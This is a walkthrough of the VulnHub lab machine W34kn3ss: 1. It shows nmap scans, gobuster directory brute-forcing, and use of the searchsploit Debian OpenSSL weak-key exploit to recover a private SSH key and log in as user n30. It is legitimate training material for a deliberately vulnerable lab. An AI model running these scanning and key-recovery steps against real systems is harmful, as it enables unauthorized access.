::::::::::::::::::: page
# W34kn3ss: 1 {#w34kn3ss-1 .title}

\

## 

## W34kn3ss: 1

- **[W34kn3ss: 1]{style="color:#5e5c64;"}** :-

<!-- -->

- Download the machine : <https://www.vulnhub.com/entry/w34kn3ss-1,270/>

![](848-1.png)

- Open ova file .
- Then click finish .
- Start the machine .

1.  [Network Scanning]{style="color:#3f4043;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](848-2.png)

- Run nmap master command :

::: codebox
    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.249
:::

![](848-3.png)

- Find available port in the machine ( Optional ) :

::: codebox
    nmap -v -p- 192.168.2.249
:::

- 

::: codebox
    nmap -sC -sV -A 192.168.2.249 
:::

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

::: codebox
    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.249
:::

![](848-4.png)

1.  [Web Enumeration]{style="color:#3f4043;"} :

- IP visit in browser : <http://192.168.2.249> <https://192.168.2.249/>
  <http://192.168.2.249/test/>

![](848-5.png)

- Entry in hosts file :

::: codebox
    nano /etc/hosts
:::

![](848-6.png)

- Visit the hostname : <http://weakness.jth/>

![](848-7.png)

- Clue Found :

::: codebox
    n30
:::

- Directory brute-force in url :

::: codebox
    gobuster dir -u http://weakness.jth/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
:::

![](848-8.png)

- Visit the endpoints : <http://weakness.jth/robots.txt>
  <http://weakness.jth/private/>

![](848-9.png)

1.  [Make SSH Connection]{style="color:#3f4043;"} :

- Download the both file :

::: codebox
    wget http://weakness.jth/private/files/mykey.pub
:::

- 

::: codebox
    wget http://weakness.jth/private/files/notes.txt
:::

![](848-10.png)

- Search the exploit of openssl 0.9.8c-1 :

::: codebox
    searchsploit openssl 0.9.8c-1
:::

![](848-11.png)

- Download the rsa file :

::: codebox
    searchsploit -x 5622
:::

![](848-12.png)

- After file download then extract the file :

::: codebox
    tar -xvjf 5622.tar.bz2
:::

- Navigate the directory :

::: codebox
    cd /rsa/2048
:::

- Decode the rsa value :

::: codebox
    grep -r -l "AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw=="
:::

-r : Recursive search .

-l : Print file name .

![](848-13.png)

- SSH login using private key :

::: codebox
    ssh -i 4161de56829de2fe64b9055711f531c1-2537 n30@weakness.jth
:::

![](848-14.png)
:::::::::::::::::::
